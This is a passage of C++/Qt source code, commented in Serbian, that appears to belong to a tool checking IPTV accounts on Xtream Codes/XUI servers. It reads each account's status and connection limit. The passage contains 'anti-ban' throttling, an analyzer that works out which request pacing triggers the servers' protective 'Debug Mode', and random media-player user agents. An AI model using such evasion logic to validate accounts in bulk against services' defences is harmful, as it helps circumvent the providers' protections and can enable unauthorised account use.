    std::unique_lock<std::mutex> lk(st->mx);
    auto now = std::chrono::steady_clock::now();
    if (now < st->nextSendTime) {
        auto waitMs = std::chrono::duration_cast<std::chrono::milliseconds>(
            st->nextSendTime - now).count();
        st->nextSendTime = st->nextSendTime + std::chrono::milliseconds(minDelayMs);
        lk.unlock();
        for (int i = 0; i < (int)(waitMs / 100) + 1 && !stopFlag.load(); i++)
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
    } else {
        st->nextSendTime = now + std::chrono::milliseconds(minDelayMs);
        lk.unlock();
    }
}

static void resetSeqThrottle() {
    std::lock_guard<std::mutex> lk(g_seqThrottleMx);
    for (auto* st : g_seqThrottle) delete st;
    g_seqThrottle.clear();
}

// ═══════════════════════════════════════════════════════════════════
// THREAD POOL
// ═══════════════════════════════════════════════════════════════════

class StdThreadPool {
public:
    explicit StdThreadPool(int numThreads) : m_stop(false) {
        for (int i = 0; i < numThreads; ++i) {
            m_workers.emplace_back([this]() {
                for (;;) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(m_mutex);
                        m_cv.wait(lock, [this]{ return m_stop || !m_tasks.empty(); });
                        if (m_stop && m_tasks.empty()) return;
                        task = std::move(m_tasks.front());
                        m_tasks.pop();
                    }
                    task();
                    {
                        std::unique_lock<std::mutex> lock(m_doneMutex);
                        ++m_completedCount;
                        m_doneCv.notify_all();
                    }
                }
            });
        }
    }

    ~StdThreadPool() {
        {
            std::unique_lock<std::mutex> lock(m_mutex);
            m_stop = true;
        }
        m_cv.notify_all();
        for (auto &t : m_workers) if (t.joinable()) t.join();
    }

    void enqueue(std::function<void()> task) {
        {
            std::unique_lock<std::mutex> lock(m_mutex);
            m_tasks.push(std::move(task));
            ++m_totalCount;
        }
        m_cv.notify_one();
    }

    void waitForAll() {
        std::unique_lock<std::mutex> lock(m_doneMutex);
        m_doneCv.wait(lock, [this]{
            std::unique_lock<std::mutex> tl(m_mutex);
            return m_tasks.empty() && m_completedCount >= m_totalCount;
        });
    }

    void waitForAllOrStop(std::atomic<bool> &stopFlag) {
        while (!stopFlag.load(std::memory_order_acquire)) {
            std::unique_lock<std::mutex> lock(m_doneMutex);
            bool done = m_doneCv.wait_for(lock, std::chrono::milliseconds(50), [this]{
                std::unique_lock<std::mutex> tl(m_mutex);
                return m_tasks.empty() && m_completedCount >= m_totalCount;
            });
            if (done) break;
        }
        if (stopFlag.load(std::memory_order_acquire)) {
            requestStop();
        }
    }

    void requestStop() {
        std::unique_lock<std::mutex> lock(m_mutex);
        while (!m_tasks.empty()) {
            m_tasks.pop();
            ++m_completedCount;
        }
        m_doneCv.notify_all();
    }

private:
    std::vector<std::thread>          m_workers;
    std::queue<std::function<void()>> m_tasks;
    std::mutex                        m_mutex;
    std::condition_variable           m_cv;
    std::mutex                        m_doneMutex;
    std::condition_variable           m_doneCv;
    std::atomic<bool>                 m_stop;
    std::atomic<int>                  m_totalCount{0};
    std::atomic<int>                  m_completedCount{0};
};

// ═══════════════════════════════════════════════════════════════════
// GLOBALNI KEŠ PO SERVERU
// ═══════════════════════════════════════════════════════════════════

struct ServerCache {
    enum class State { Unknown, Up, Down };
    State     state      = State::Unknown;
    int       avgLatency = 2000;
    QDateTime lastCheck;
};

static std::mutex                     g_serverCacheMutex;
static QMap<QString, ServerCache>     g_serverCache;

// ── TCP DEAD DETEKCIJA (samo čisti status:0 timeoutovi) ──
static std::mutex        g_tcpDeadMutex;
static QMap<QString, int> g_serverConsecTimeouts; // broji uzastopne čiste timeoutove
// ── TCP PING KEŠ — jedan ping po serveru po scanu (anti-ban) ──
static std::mutex          g_tcpPingCacheMutex;
static QMap<QString, bool> g_tcpPingResultCache; // base → tcpPingOk
// ── MOVIE STREAM ID CACHE — skip M3U download za XUI slow servere ──
static std::mutex              g_movieIdCacheMutex;
static QMap<QString, int>      g_movieStreamId;   // base → movie stream ID (npr. 95937)
static QMap<QString, QString>  g_movieStreamExt;  // base → ekstenzija ("mkv", "mp4")

// ── XUI DEBUG MODE tracking ──
static std::mutex         g_xuiDebugMutex;
static QMap<QString, int> g_xuiDebugCount;      // broj Debug Mode odgovora po serveru
static QMap<QString, std::chrono::steady_clock::time_point> g_xuiDebugExpiry; // kada prestaje
static QMap<QString, int> g_xuiEpisodeCount;    // broj Debug Mode epizoda (za slow-scan detekciju)

static void recordXuiDebug(const QString &base) {
    std::lock_guard<std::mutex> lk(g_xuiDebugMutex);
    int cnt = ++g_xuiDebugCount[base];
    if (cnt == 1) {
        // Timer se postavlja JEDNOM — cnt > 1 ga ne resetuje!
        int _eps = g_xuiEpisodeCount.value(base, 0) + 1;
        int _pauseSec = (_eps >= 8) ? 120 : (_eps >= 5) ? 90 : (_eps >= 3) ? 60 : 30;
        g_xuiDebugExpiry[base] = std::chrono::steady_clock::now() + std::chrono::seconds(_pauseSec);
        ++g_xuiEpisodeCount[base];
        qDebug() << "[XUI DEBUG GLOBAL] Server" << base
                 << "Debug Mode epizoda" << _eps << ", pauza" << _pauseSec << "s";
        qDebug() << "[XUI DEBUG GLOBAL] Server" << base
                 << "Debug Mode epizoda" << g_xuiEpisodeCount[base] << ", pauza 30s";
    }
}

static bool isXuiDebugMode(const QString &base) {
    std::lock_guard<std::mutex> lk(g_xuiDebugMutex);
    if (!g_xuiDebugExpiry.contains(base)) return false;
    if (std::chrono::steady_clock::now() < g_xuiDebugExpiry[base]) return true;
    // Isteklo — resetuj
    g_xuiDebugCount.remove(base);
    g_xuiDebugExpiry.remove(base);
    return false;
}

static void resetXuiDebug(const QString &base) {
    std::lock_guard<std::mutex> lk(g_xuiDebugMutex);
    g_xuiDebugCount.remove(base);
    g_xuiDebugExpiry.remove(base);
    // g_xuiEpisodeCount se NE resetuje — pamtimo da je server "slow scan"
}

static bool isXuiSlowServer(const QString &base) {
    // Server koji je imao >= 1 Debug Mode epizodu → slow scan (1 thread, 1500ms delay)
    std::lock_guard<std::mutex> lk(g_xuiDebugMutex);
    return g_xuiEpisodeCount.value(base, 0) >= 1;
}
// ═══════════════════════════════════════════════════════════════════
// ADVANCED XUI DEBUG ANALYZER — TAČNA DIJAGNOSTIKA Debug Mode trigera
// ═══════════════════════════════════════════════════════════════════

struct XuiReqEvent {
    int64_t  timestampMs;
    int64_t  gapFromPrevMs;
    QString  reqType;
    QString  reqUrl;
    int      httpStatus;
    bool     isDebugMode;
    int      bodySize;
    int      activeSlots;
    int      episodeBefore;
    int      threadId;
};

struct XuiServerAnalysis {
    std::mutex                mx;
    QList<XuiReqEvent>        events;
    int64_t                   scanStartMs     = 0;
    int                       debugTriggerIdx = -1;
    int                       totalRequests   = 0;
    int                       debugModeHits   = 0;
    int                       maxConcurrent   = 0;
    int64_t                   minGapMs        = INT64_MAX;
    int64_t                   maxGapMs        = 0;
    int64_t                   sumGapMs        = 0;
    int                       gapCount        = 0;
    int64_t                   lastApiMs       = -1;
    int64_t                   lastM3uMs       = -1;
    int64_t                   lastStreamMs    = -1;
};

static std::mutex                              g_xuiAnalyzerMx;
static QMap<QString, XuiServerAnalysis*>       g_xuiAnalyzer;
static std::chrono::steady_clock::time_point   g_xuiAnalyzerStart;
static bool                                    g_xuiAnalyzerStarted = false;

static XuiServerAnalysis* getXuiAnalysis(const QString &base) {
    std::lock_guard<std::mutex> lk(g_xuiAnalyzerMx);
    if (!g_xuiAnalyzer.contains(base))
        g_xuiAnalyzer[base] = new XuiServerAnalysis();
    return g_xuiAnalyzer[base];
}

static void xuiAnalyzerReset() {
    std::lock_guard<std::mutex> lk(g_xuiAnalyzerMx);
    for (auto* a : g_xuiAnalyzer) delete a;
    g_xuiAnalyzer.clear();
    g_xuiAnalyzerStart   = std::chrono::steady_clock::now();
    g_xuiAnalyzerStarted = true;
}

static void xuiAnalyzerBefore(const QString &base, const QString &reqType, const QString &url) {
    if (!g_xuiAnalyzerStarted) return;
    auto* a = getXuiAnalysis(base);
    std::lock_guard<std::mutex> lk(a->mx);

    int64_t nowMs = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - g_xuiAnalyzerStart).count();

    XuiReqEvent ev;
    ev.timestampMs   = nowMs;
    ev.reqType       = reqType;
    ev.reqUrl        = url.left(80);
    ev.httpStatus    = 0;
    ev.isDebugMode   = false;
    ev.bodySize      = 0;
    ev.activeSlots = 0; // popunjava se u Worker kontekstu gde je g_serverActiveCalls dostupan
    ev.episodeBefore = g_xuiEpisodeCount.value(base, 0);
    ev.threadId      = (int)(std::hash<std::thread::id>{}(std::this_thread::get_id()) & 0xFFFF);

        int64_t globalPrev = qMax(a->lastApiMs, qMax(a->lastM3uMs, a->lastStreamMs));
    ev.gapFromPrevMs = (globalPrev >= 0) ? (nowMs - globalPrev) : -1;

    if (ev.gapFromPrevMs >= 0) {
        a->sumGapMs  += ev.gapFromPrevMs;
        a->gapCount++;
        a->minGapMs   = qMin(a->minGapMs, ev.gapFromPrevMs);
        a->maxGapMs   = qMax(a->maxGapMs, ev.gapFromPrevMs);
    }
    a->maxConcurrent = qMax(a->maxConcurrent, ev.activeSlots);
    a->totalRequests++;

    if      (reqType == "api")    a->lastApiMs    = nowMs;
    else if (reqType == "m3u")    a->lastM3uMs    = nowMs;
    else if (reqType == "stream") a->lastStreamMs = nowMs;

    a->events.append(ev);

    qDebug() << QString("[XUI_ANAL] #%1 T+%2ms gap=%3ms type=%4 slots=%5 eps=%6 tid=%7 url=%8")
                .arg(a->totalRequests)
                .arg(nowMs)
                .arg(ev.gapFromPrevMs)
                .arg(reqType)
                .arg(ev.activeSlots)
                .arg(ev.episodeBefore)
                .arg(ev.threadId, 4, 16, QChar('0'))
                .arg(url.left(60));
}

static void xuiAnalyzerAfter(const QString &base, int httpStatus,
                              bool isDebugMode, int bodySize) {
    if (!g_xuiAnalyzerStarted) return;
    auto* a = getXuiAnalysis(base);
    std::lock_guard<std::mutex> lk(a->mx);

    if (!a->events.isEmpty()) {
        XuiReqEvent &last = a->events.last();
        last.httpStatus  = httpStatus;
        last.isDebugMode = isDebugMode;
        last.bodySize    = bodySize;

        if (isDebugMode) {
            a->debugModeHits++;
            if (a->debugTriggerIdx < 0)
                a->debugTriggerIdx = a->events.size() - 1;

            qDebug() << "╔══════════════════════════════════════════════════════════════╗";
            qDebug() << "║  🔴 XUI DEBUG MODE TRIGGER AUTOPSY                          ║";
            qDebug() << "╠══════════════════════════════════════════════════════════════╣";
            qDebug() << QString("║  Server     : %1").arg(base);
            qDebug() << QString("║  Trigger req: #%1 od %2 ukupno")
                        .arg(a->events.size()).arg(a->totalRequests);
            qDebug() << QString("║  Vreme      : T+%1ms od starta skeniranja")
                        .arg(last.timestampMs);
            qDebug() << QString("║  Tip req    : %1").arg(last.reqType);
            qDebug() << QString("║  Gap        : %1ms od prethodnog zahteva")
                        .arg(last.gapFromPrevMs);
            qDebug() << QString("║  ActiveSlots: %1 (max bio: %2)")
                        .arg(last.activeSlots).arg(a->maxConcurrent);
            qDebug() << QString("║  Episode#   : %1").arg(last.episodeBefore);
            qDebug() << "╠══════════════════════════════════════════════════════════════╣";
            qDebug() << "║  KOMPLETAN REQUEST TIMELINE:";

            for (int i = 0; i < a->events.size(); ++i) {
                const XuiReqEvent &e = a->events[i];
                QString marker = (i == a->events.size()-1) ? "👉" : "  ";
                qDebug() << QString("║  %1 [%2] T+%3ms gap=%4ms type=%5 status=%6 debug=%7 bytes=%8 slots=%9")
                            .arg(marker)
                            .arg(i+1, 3)
                            .arg(e.timestampMs, 6)
                            .arg(e.gapFromPrevMs < 0 ? -1 : e.gapFromPrevMs, 5)
                            .arg(e.reqType, 6)
                            .arg(e.httpStatus, 3)
                            .arg(e.isDebugMode ? "YES" : " no")
                            .arg(e.bodySize, 5)
                            .arg(e.activeSlots);
            }

            qDebug() << "╠══════════════════════════════════════════════════════════════╣";
            qDebug() << "║  GAP STATISTIKE:";
            if (a->gapCount > 0) {
                int64_t avgGap = a->sumGapMs / a->gapCount;
                qDebug() << QString("║  Min gap: %1ms | Max gap: %2ms | Avg gap: %3ms")
                            .arg(a->minGapMs).arg(a->maxGapMs).arg(avgGap);
                qDebug() << QString("║  Requests/min (est.): %1")
                            .arg(avgGap > 0 ? (int)(60000.0 / avgGap) : -1);
                qDebug() << "╠══════════════════════════════════════════════════════════════╣";
                qDebug() << "║  ANALIZA:";
                if (avgGap < 500)
                    qDebug() << "║  ⚠️  PREKRATKI GAPOVI! Server ne može da podnese ovaj ritam.";
                if (a->maxConcurrent > 1)
                    qDebug() << QString("║  ⚠️  CONCURRENT CONNECTIONS: %1 — previše!").arg(a->maxConcurrent);
                qDebug() << QString("║  🔧 PREPORUČENI MIN GAP: %1ms").arg(qMin(a->minGapMs, last.gapFromPrevMs) * 3);
            }

            qDebug() << "╠══════════════════════════════════════════════════════════════╣";
            qDebug() << "║  SEKVENCA ZAHTEVA PRE TRIGERISANJA:";
            int showFrom = qMax(0, (int)a->events.size() - 6);
            for (int i = showFrom; i < a->events.size(); ++i) {
                const XuiReqEvent &e = a->events[i];
                qDebug() << QString("║   [%1] %2 → status=%3 debug=%4 gap=%5ms")
                            .arg(i+1).arg(e.reqType, 6)
                            .arg(e.httpStatus).arg(e.isDebugMode ? "YES" : "no")
                            .arg(e.gapFromPrevMs);
            }
            qDebug() << "╚══════════════════════════════════════════════════════════════╝";
        }

        qDebug() << QString("[XUI_ANAL_RESP] #%1 status=%2 debug=%3 bytes=%4")
                    .arg(a->totalRequests)
                    .arg(httpStatus)
                    .arg(isDebugMode ? "YES" : "no")
                    .arg(bodySize);
    }
}

static void xuiAnalyzerDumpFinal(const QString &base) {
    auto* a = getXuiAnalysis(base);
    std::lock_guard<std::mutex> lk(a->mx);
    if (a->events.isEmpty()) return;

    qDebug() << "╔═══════════════════════════════════════════════════════════════╗";
    qDebug() << "║  📊 XUI ANALYZER — FINALNI IZVEŠTAJ";
    qDebug() << QString("║  Server: %1").arg(base);
    qDebug() << QString("║  Ukupno zahteva : %1").arg(a->totalRequests);
    qDebug() << QString("║  Debug Mode hits: %1").arg(a->debugModeHits);
    qDebug() << QString("║  Max concurrent : %1").arg(a->maxConcurrent);
    if (a->debugTriggerIdx >= 0)
        qDebug() << QString("║  1. Debug Mode  : zahtev #%1 od %2")
                    .arg(a->debugTriggerIdx+1).arg(a->totalRequests);
    if (a->gapCount > 0) {
        int64_t avg = a->sumGapMs / a->gapCount;
        qDebug() << QString("║  Gap: min=%1ms max=%2ms avg=%3ms")
                    .arg(a->minGapMs).arg(a->maxGapMs).arg(avg);
        qDebug() << QString("║  Preporučeni min gap: %1ms").arg(avg * 3);
    }
    QMap<QString, int> typeCount;
    for (const auto &e : a->events) if (e.isDebugMode) typeCount[e.reqType]++;
    qDebug() << "║  Debug Mode po tipu zahteva:";
    for (auto it = typeCount.begin(); it != typeCount.end(); ++it)
        qDebug() << QString("║    %1 → %2× debug").arg(it.key()).arg(it.value());
    qDebug() << "╚═══════════════════════════════════════════════════════════════╝";
}
static void recordTcpTimeout(const QString &base) {
    std::lock_guard<std::mutex> lock(g_tcpDeadMutex);
    g_serverConsecTimeouts[base]++;
}

static void resetTcpTimeout(const QString &base) {
    std::lock_guard<std::mutex> lock(g_tcpDeadMutex);
    g_serverConsecTimeouts.remove(base);
}

static bool isTcpDead(const QString &base) {
    std::lock_guard<std::mutex> lock(g_tcpDeadMutex);
    return g_serverConsecTimeouts.value(base, 0) >= 5;
}

static ServerCache::State getCachedState(const QString &base) {
    std::lock_guard<std::mutex> lock(g_serverCacheMutex);
    if (!g_serverCache.contains(base)) return ServerCache::State::Unknown;
    const ServerCache &sc = g_serverCache[base];
    if (sc.lastCheck.secsTo(QDateTime::currentDateTime()) > 60)
        return ServerCache::State::Unknown;
    return sc.state;
}

static int getCachedLatency(const QString &base) {
    std::lock_guard<std::mutex> lock(g_serverCacheMutex);
    if (!g_serverCache.contains(base)) return 2000;
    return g_serverCache[base].avgLatency;
}

static void setCachedState(const QString &base, ServerCache::State state, int latencyMs = -1) {
    std::lock_guard<std::mutex> lock(g_serverCacheMutex);
    ServerCache &sc = g_serverCache[base];
    sc.state        = state;
    sc.lastCheck    = QDateTime::currentDateTime();
    if (latencyMs > 0)
        sc.avgLatency = (sc.avgLatency == 2000)
            ? latencyMs
            : (sc.avgLatency * 7 + latencyMs * 3) / 10;
}

// ═══════════════════════════════════════════════════════════════════
// PORTAL PROBE KEŠ
// ═══════════════════════════════════════════════════════════════════

static std::mutex               g_portalProbeMutex;
static QMap<QString, int>       g_portalProbeResult; // 1=ok, 2=mrtav, 3=ban IP

// ═══════════════════════════════════════════════════════════════════
// REAKTIVNI THROTTLE PO SERVERU
// ═══════════════════════════════════════════════════════════════════

struct ReactiveThrottleState {
    std::mutex mx;
    int  delayMs      = 150;
    int  minDelayMs   = 50;
    int  maxDelayMs   = 5000;
    int  consecOk     = 0;
    int  consecFail   = 0;
    int  total429     = 0;     // Ukupno 429 odgovora — mera agresivnosti servera
    int  total403     = 0;     // Ukupno 403 odgovora
    bool initialized  = false;
    bool isAggressive = false; // Server aktivno blokira
    std::chrono::steady_clock::time_point lastRequest;
};

static std::mutex                            g_reactMutex;
static QMap<QString, ReactiveThrottleState*> g_reactThrottle;

static ReactiveThrottleState* getReactThrottle(const QString &key) {
    std::lock_guard<std::mutex> lk(g_reactMutex);
    if (!g_reactThrottle.contains(key))
        g_reactThrottle[key] = new ReactiveThrottleState();
    return g_reactThrottle[key];
}

static void reactiveWait(const QString &serverKey) {
    auto* rt = getReactThrottle(serverKey);
    std::unique_lock<std::mutex> lk(rt->mx);
    if (rt->initialized) {
        auto now     = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                           now - rt->lastRequest).count();
        // Koristimo efektivni delay: min između trenutnog i minimalnog
        int effectiveDelay = rt->isAggressive ? rt->delayMs : qMax(rt->minDelayMs, rt->delayMs);
        int wait = effectiveDelay - (int)elapsed;
        if (wait > 0) {
            lk.unlock();
            std::this_thread::sleep_for(std::chrono::milliseconds(wait));
            lk.lock();
        }
    }
    rt->lastRequest = std::chrono::steady_clock::now();
    rt->initialized = true;
}

static void reactiveReport(const QString &serverKey, int httpStatus) {
    auto* rt = getReactThrottle(serverKey);
    std::lock_guard<std::mutex> lk(rt->mx);

    if (httpStatus == 200 || httpStatus == 206) {
        rt->consecFail = 0;
        ++rt->consecOk;
        // Brzo ubrzavanje: posle 2 uzastopna OK, smanji za 25%
        if (rt->consecOk >= 2) {
            int newDelay = qMax(rt->minDelayMs, (int)(rt->delayMs * 0.75));
            if (newDelay != rt->delayMs) {
                rt->delayMs = newDelay;
                qDebug() << "[REACTIVE] Server" << serverKey
                         << "→ OK x" << rt->consecOk
                         << ", delay=" << rt->delayMs << "ms";
            }
            rt->consecOk = 0;
        }
    } else if (httpStatus == 429) {
        rt->consecOk = 0;
        ++rt->consecFail;
        ++rt->total429;
        rt->isAggressive = true;
        // Agresivno povećanje: *2.5 + 1500ms, max 15000ms
        rt->delayMs  = qMin(rt->maxDelayMs, (int)(rt->delayMs * 2.5) + 1500);
        rt->minDelayMs = qMax(rt->minDelayMs, 800); // Podidi minimum za ovaj server
        qDebug() << "[REACTIVE]" << serverKey
                 << "429 total=" << rt->total429
                 << "→ delay=" << rt->delayMs << "ms (aggressive)";
    } else if (httpStatus == 403) {
        rt->consecOk = 0;
        ++rt->consecFail;
        ++rt->total403;
        rt->isAggressive = true;
        rt->delayMs    = qMin(rt->maxDelayMs, rt->delayMs + 2000);
        rt->minDelayMs = qMax(rt->minDelayMs, 1000);
        qDebug() << "[REACTIVE]" << serverKey
                 << "403 total=" << rt->total403
                 << "→ delay=" << rt->delayMs << "ms";
    } else if (httpStatus == 503) {
        rt->consecOk = 0;
        ++rt->consecFail;
        rt->delayMs = qMin(rt->maxDelayMs, rt->delayMs + 800);
        qDebug() << "[REACTIVE]" << serverKey
                 << "503 → delay=" << rt->delayMs << "ms";
    }
}

// ═══════════════════════════════════════════════════════════════════
// SEMAFOR PO SERVERU
// ═══════════════════════════════════════════════════════════════════

static std::mutex             g_serverSemMutex;
static QMap<QString, int>     g_serverActiveCalls;

static void acquireServerSlot(const QString &base, int maxPerServer,
                               std::atomic<bool> &stopFlag) {
    while (!stopFlag.load(std::memory_order_acquire)) {
        {
            std::lock_guard<std::mutex> lock(g_serverSemMutex);
            int current = g_serverActiveCalls.value(base, 0);
            if (current < maxPerServer) {
                g_serverActiveCalls[base] = current + 1;
                return;
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

static void releaseServerSlot(const QString &base) {
    std::lock_guard<std::mutex> lock(g_serverSemMutex);
    int v = g_serverActiveCalls.value(base, 1) - 1;
    if (v <= 0) g_serverActiveCalls.remove(base);
    else        g_serverActiveCalls[base] = v;
}

// ═══════════════════════════════════════════════════════════════════
// DNS KEŠ
// ═══════════════════════════════════════════════════════════════════

static std::mutex              g_dnsCacheMutex;
static QMap<QString, bool>     g_dnsCache;

static bool dnsResolves(const QString &host) {
    {
        std::lock_guard<std::mutex> lock(g_dnsCacheMutex);
        if (g_dnsCache.contains(host)) return g_dnsCache[host];
    }
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    bool ok = (getaddrinfo(host.toStdString().c_str(), nullptr, &hints, &res) == 0);
    if (res) freeaddrinfo(res);
    {
        std::lock_guard<std::mutex> lock(g_dnsCacheMutex);
        g_dnsCache[host] = ok;
    }
    return ok;
}

static void batchDnsResolve(const QList<QString> &hosts) {
    std::vector<std::future<void>> futures;
    futures.reserve(hosts.size());
    for (const QString &host : hosts)
        futures.push_back(std::async(std::launch::async, [host]() { dnsResolves(host); }));
    for (auto &f : futures) if (f.valid()) f.wait();
}

// ═══════════════════════════════════════════════════════════════════
// TCP PING
// ═══════════════════════════════════════════════════════════════════

static bool tcpPing(const QString &host, int port, int timeoutMs = 2000) {
#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
#endif
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host.toStdString().c_str(),
                    std::to_string(port).c_str(), &hints, &res) != 0) return false;
#ifdef _WIN32
    SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) { freeaddrinfo(res); return false; }
    u_long mode = 1; ioctlsocket(sock, FIONBIO, &mode);
    connect(sock, res->ai_addr, (int)res->ai_addrlen);
    freeaddrinfo(res);
    fd_set wfds; FD_ZERO(&wfds); FD_SET(sock, &wfds);
    struct timeval tv; tv.tv_sec = timeoutMs/1000; tv.tv_usec = (timeoutMs%1000)*1000;
    bool connected = false;
    if (select((int)sock+1, nullptr, &wfds, nullptr, &tv) > 0) {
        int err=0, len=sizeof(err);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&err, &len);
        connected = (err == 0);
    }
    closesocket(sock); return connected;
#else
    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); return false; }
    fcntl(sock, F_SETFL, O_NONBLOCK);
    connect(sock, res->ai_addr, res->ai_addrlen);
    freeaddrinfo(res);
    fd_set wfds; FD_ZERO(&wfds); FD_SET(sock, &wfds);
    struct timeval tv; tv.tv_sec = timeoutMs/1000; tv.tv_usec = (timeoutMs%1000)*1000;
    bool connected = false;
    if (select(sock+1, nullptr, &wfds, nullptr, &tv) > 0) {
        int err=0; socklen_t len=sizeof(err);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len);
        connected = (err == 0);
    }
    ::close(sock); return connected;
#endif
}

// ═══════════════════════════════════════════════════════════════════
// PAMETAN ODABIR KANALA
// ═══════════════════════════════════════════════════════════════════

struct SmartChannel { QString url; QString type; };

static QList<SmartChannel> smartSelectChannels(const QList<QString> &all, const QString &serverBase = "") {
    QMap<QString, SmartChannel> best;
    for (const QString &url : all) {
        if (url.contains("videezy.com", Qt::CaseInsensitive)) continue;
        if (url.contains("/test",       Qt::CaseInsensitive)) continue;
        // Odbaci nepotpune URL-ove (goli host bez putanje sa stream ID-em)
        {
            QUrl _u(url);
            QString _path = _u.path();
            // Putanja mora imati bar 2 segmenta posle hosta (npr. /user/pass/id)
            QStringList _segs = _path.split('/', Qt::SkipEmptyParts);
            if (_segs.size() < 2) continue;
        }
        // Preskoči eksterne CDN URL-ove koji nisu na istom hostu kao server
        if (!serverBase.isEmpty()) {
            QString urlBase = extractBaseUrlSafe(url);
            if (!urlBase.isEmpty() && urlBase != serverBase) continue;
        }
        QString type  = "unknown";
        QString lower = url.toLower();
        if      (lower.contains("/live/"))                               type = "live";
        else if (lower.contains("/movie/") || lower.contains("/vod/"))  type = "movie";
        else if (lower.contains("/series/"))                             type = "series";
        else if (lower.endsWith(".ts") || lower.endsWith(".m3u8"))       type = "live";
        else if (lower.endsWith(".mp4") || lower.endsWith(".mkv"))       type = "movie";
        if (!best.contains(type)) best[type] = { url, type };
        if (best.contains("live") && best.contains("movie") && best.contains("series")) break;
    }
    if (best.isEmpty() || (best.size() == 1 && best.contains("unknown"))) {
        best.clear();
        int n = all.size();
        QList<int> positions;
        if      (n == 1)  positions << 0;
        else if (n <= 4)  for (int i = 0; i < n; ++i) positions << i;
        else              positions << 0 << (n/3) << (n*2/3) << (n-1);
        for (int pos : positions) {
            if (pos < n && !all[pos].contains("videezy.com", Qt::CaseInsensitive)
                        && !all[pos].contains("/test", Qt::CaseInsensitive)) {
                SmartChannel sc; sc.url = all[pos]; sc.type = "unknown";
                best[QString::number(pos)] = sc;
            }
        }
    }
    return best.values();
}

// ═══════════════════════════════════════════════════════════════════
// OSTALE HELPER FUNKCIJE
// ═══════════════════════════════════════════════════════════════════

QMap<QString, QString> getHeadersForHost(const QString &host) {
    QMap<QString, QString> headers;
    QString hostClean = host;
    hostClean.replace("http://", "").replace("https://", "");
    int portPos = hostClean.indexOf(':');
    if (portPos != -1) hostClean = hostClean.left(portPos);
    if (host.contains("maventv.one") || host.contains("217.60.253.157")) {
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36";
        headers["Referer"]    = "http://maventv.one/";
        headers["Accept"]     = "*/*";
        headers["Host"]       = "maventv.one:8080";
        headers["Connection"] = "Keep-Alive";
    } else if (host.contains("xc.adultiptv.net")) {
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36";
        headers["Referer"]    = "http://" + hostClean + "/";
        headers["Accept"]     = "*/*";
        headers["Host"]       = hostClean;
        headers["Connection"] = "keep-alive";
    } else {
        headers["User-Agent"] = "Lavf53.32.100";
        headers["Accept"]     = "*/*";
        headers["Connection"] = "close";
        headers["Icy-MetaData"] = "1";
        headers["Host"]       = hostClean;
    }
    return headers;
}

QString getRandomUserAgent() {
    static const std::vector<std::string> agents = {
        "Lavf53.32.100", "VLC/3.0.0 LibVLC/3.0.0",
        "FFmpeg/4.2.4", "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "KODI/18.0 (Linux; Android 10)", "ExoPlayerLib/2.9.0 (Linux; Android 10)"
    };
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, (int)agents.size()-1);
    return QString::fromStdString(agents[dis(gen)]);
}

QMap<QString, QString> getHeadersForPlayback(const QString &host) {
    QMap<QString, QString> headers;
    headers["User-Agent"] = getRandomUserAgent();
    headers["Accept"]     = "*/*";
    headers["Connection"] = "keep-alive";
    headers["Icy-MetaData"] = "1";
    QString hostClean = host;
    hostClean.replace("http://", "").replace("https://", "");
    int portPos = hostClean.indexOf(':');
    if (portPos != -1) hostClean = hostClean.left(portPos);
    headers["Host"] = hostClean;
    return headers;
}

QList<QString> extractStreamsFromM3U(const QString &m3uText, const QString &baseUrl) {
    QList<QString> streams;
    QStringList lines = m3uText.split('\n');
    for (int i = 0; i < lines.size() - 1; ++i) {
        QString line = lines[i].trimmed();
        if (line.startsWith("#EXTINF")) {
            QString nextLine = lines[i+1].trimmed();
            if (nextLine.startsWith("http")) {
                if (nextLine.startsWith("http://:8080")) nextLine = baseUrl + nextLine.mid(12);
                if (!nextLine.contains("/admin") && !nextLine.contains("account_info"))
                    streams.append(nextLine);
            }
        } else if (line.startsWith("http")) {
            if (!line.contains("/admin") && !line.contains("account_info"))
                streams.append(line);
        }
    }
    return streams;
}

// ═══════════════════════════════════════════════════════════════════
// CheckResult STRUKTURA
// ═══════════════════════════════════════════════════════════════════

struct CheckResult {
    QString type; QString content; int maxConn; bool isValid; QString host; QString vpnTag;
    bool needsDmRetry;
    CheckResult() : maxConn(1), isValid(false), needsDmRetry(false) {}
};

CheckResult extractResult(const json &info, const QString &link, const QString &base, const QString &vpnTag = "") {
    CheckResult result; result.isValid = false; result.type = "inactive"; result.vpnTag = vpnTag;
    if (info.find("user_info") == info.end()) return result;
    auto ui = info["user_info"];
    std::string status = "";
    if (ui.find("status") != ui.end() && !ui["status"].is_null()) {
        status = ui["status"].get<std::string>();
        std::transform(status.begin(), status.end(), status.begin(), ::tolower);
    }
    if (status != "active") return result;
    int maxConn = 1;
    if (ui.find("max_connections") != ui.end() && !ui["max_connections"].is_null()) {
        try {
            if (ui["max_connections"].is_string()) maxConn = std::stoi(ui["max_connections"].get<std::string>());
            else maxConn = ui["max_connections"].get<int>();
        } catch (...) {}
    }
    std::string activeCons = "nepoznato";
    if (ui.find("active_cons") != ui.end() && !ui["active_cons"].is_null()) {
        if (ui["active_cons"].is_string()) activeCons = ui["active_cons"].get<std::string>();
        else activeCons = std::to_string(ui["active_cons"].get<int>());
    }
    QString expiresStr = "Unlimited";
